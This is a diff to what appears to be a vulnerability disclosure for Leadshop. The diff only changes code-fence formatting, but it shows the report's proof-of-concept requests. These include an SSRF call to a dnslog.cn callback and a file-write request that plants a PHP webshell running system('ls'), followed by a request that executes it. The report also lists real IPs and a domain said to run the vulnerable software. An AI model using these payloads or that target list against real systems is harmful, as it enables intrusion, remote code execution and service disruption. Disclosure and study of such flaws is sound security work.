@@ -28,24 +28,24 @@ Proof of Concept:
 -
 Poc：
 (This url is applied from DNSLog(http://dnslog.cn/) in advance. Click "Get SubDomain", access the poc, and click "Refresh Record" to Refresh.)  
-```
+  ```shell script
 https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn  
 ```
 DNSLog picture:  
 ![img](DNSLog.png)
 
-```
+  ```shell script
 http://example.org/leadshop.php?include=ToMkdir&meta=orobos.php&data=1
 ```
 file picture:  
 ![img](tomkdir.PNG)
 
 step 1:
-```
+  ```shell script
 http://192.168.24.129/leadshop.php?include=ToMkdir&meta=/web/orobos.php&data=%3C?php%20system(%27ls%27)%20?%3E
 ```
 step 2:
-```
+  ```shell script
 http://192.168.24.129/orobos.php
 ```
 ![img](upload_trojans.PNG)
@@ -57,7 +57,7 @@ Access may make the server a dos server.
 Download, so that an attacker can download the PHP Trojan to the server.  
 Creating and deleting will destroy normal services.  
 More than ten IPs are using this service(Fofa Search:"Powered By Leadshop © 2021").  
-```
+  ```shell script
 https://8.141.175.3
 http://www.huatianlinye.com
 https://39.107.102.163
